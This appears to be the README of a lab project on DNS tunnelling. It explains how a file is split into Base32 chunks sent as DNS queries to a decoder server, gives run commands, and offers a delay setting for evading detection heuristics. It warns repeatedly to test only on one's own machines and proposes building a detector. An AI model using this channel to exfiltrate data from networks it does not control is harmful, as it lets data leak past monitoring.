# DNS-TUNELLING

Smuggle a file out using only DNS queries. A lab demo of DNS tunnelling:
an encoder turns a file into DNS questions, a decoder on your own server
rebuilds it from those questions.

> **Lab only. Test only with your own files, from your own machines, to
> a server you own.** Never point this at someone else's machine, a real
> network you do not control, a college or work network, or a public
> site without permission. The "victim" in every demo here is your own
> host: you create the test file and start the encoder yourself. There
> is no infiltration step in this project.

## How it works

```
your file ──> encoder ── DNS queries ──> decoder ──> recovered file
                │  001.<chunk>.<session>.dnstunnel.cc.cd
                │  002.<chunk>.<session>.dnstunnel.cc.cd
                │  END.<session>.dnstunnel.cc.cd
```

1. Read the file as bytes, not text, so text, PNGs and zips all work.
2. Build a stream: header `{filename, size, sha256}` + newline + file bytes.
3. Base32-encode it. Base32 is used because DNS names allow only
   letters, digits and hyphens and may be lowercased in transit;
   Base64's `+ / =` are not DNS-safe. Cost: 5 bytes become 8 chars.
4. Split into 32-character chunks, numbered `001, 002, ...`, so UDP
   reordering and retransmits do not matter.
5. Send one DNS query per chunk (QTYPE A, the data is in the question,
   the answer does not matter), waiting for a response with the same
   query ID as an ACK, resending on timeout (max 3 tries).
6. Send one `END` query. The decoder sorts the chunks, decodes them,
   splits off the header, writes `recovered_<filename>`, and checks
   size and SHA256 against the header. Match means success.

A 1 KB file is about 1,640 Base32 characters, so about 52 queries.
Slow by design: that speed-vs-stealth trade-off is the demo's point,
not a bug. See `docs/PROTOCOL.md` for the full protocol.

## Project structure

```
DNS-TUNELLING/
├── encoder.py            # encode a file, send it as DNS queries
├── decoder.py            # listen, collect chunks, rebuild the file
├── dns_topo.py           # Mininet topology: h1 10.0.0.1, h2 10.0.0.2
├── examples/
│   └── secret.txt        # sample test file ("Meet at 5")
├── docs/
│   ├── PROTOCOL.md       # protocol, packet format, limits
│   ├── DOMAIN_SETUP.md   # pointing dnstunnel.cc.cd at your server
│   └── TWO_LAPTOP_SETUP.md  # two-laptop test, no Mininet needed
├── test_roundtrip.py     # local loopback test, no Mininet needed
├── LICENSE
└── README.md
```

No dependencies. Python 3.8+ standard library only (`socket`, `struct`,
`base64`, `hashlib`, `json`). Nothing to install, which is why this
runs unchanged in a Mininet VM.

## Quickstart: local loopback (no Mininet, no root)

```bash
# Terminal 1, leave running
python3 decoder.py --host 127.0.0.1 --port 5353

# Terminal 2
python3 encoder.py examples/secret.txt --server 127.0.0.1 --port 5353 --delay 0.05

# Terminal 1 should print: size match: True, sha256 match: True
diff examples/secret.txt recovered_secret.txt   # prints nothing
```

Or run the automated check:

```bash
python3 test_roundtrip.py
```

## Two laptops (your setup, no Mininet needed)

You have two laptops on the same Wi-Fi. One runs the decoder, the
other runs the encoder. See `docs/TWO_LAPTOP_SETUP.md` for the full
steps. Short version:

```bash
# Laptop A (decoder): find its Wi-Fi IP first, e.g. 192.168.1.5
ip addr          # Linux, or ipconfig on Windows
sudo python3 decoder.py --host 0.0.0.0 --port 53

# Laptop B (encoder): point at Laptop A's IP, not at 8.8.8.8
python3 encoder.py examples/secret.txt --server 192.168.1.5 --port 53 --delay 0.05
```

If port 53 is blocked, use 5353 on both sides instead, no sudo
needed. Pass is the same as always: decoder prints size match: True
and sha256 match: True, and `diff` prints nothing.

## Mininet demo (optional, not needed with two laptops)

```bash
sudo mn --custom dns_topo.py --topo dnstun
mininet> h2 sudo python3 decoder.py --host 10.0.0.2 --port 53 &
mininet> h2 sudo tcpdump -i h2-eth0 -n udp port 53   # proof, optional
mininet> h1 python3 encoder.py secret.txt --server 10.0.0.2 --port 53
mininet> h2 sha256sum secret.txt recovered_secret.txt
```

Port 53 needs sudo on h2. The encoder needs no root. If a chunk gets
no ACK after 3 tries the encoder stops and says which chunk failed.
Re-run it; a new session id is generated each run, so a partial old
session on the decoder is abandoned, not mixed in.

## Real domain

The encoder defaults to `dnstunnel.cc.cd` and the public resolver
`8.8.8.8`. To use it for real, point the domain's nameservers at
your own server first. See `docs/DOMAIN_SETUP.md`.

## Known limits

- Plain DNS only. DNS-over-HTTPS would bypass this channel entirely.
- No encryption or authentication of chunks: anyone sniffing the link
  sees the Base32. This proves the channel, not a secure channel.
- UDP loss is handled by ACK and resend per chunk, but a decoder
  restart loses the in-memory session. There is no on-disk resume.
- Easy to flag with length, entropy and rate heuristics at high speed.
  That is exactly what the `--delay` stealth knob is for.

## Ideas to try next

1. **Stealth test:** send with `--delay 1` vs `--delay 0.05` and count
   how many queries a simple length, entropy or rate rule would flag.
2. **Binary file:** try a small PNG instead of text. Nothing changes,
   because the encoder reads bytes, not text.
3. **Detection:** write the defender side. A detector that flags
   long, high-entropy subdomains at a high rate is the natural
   counterpart to this project.

## License

MIT. See `LICENSE`.
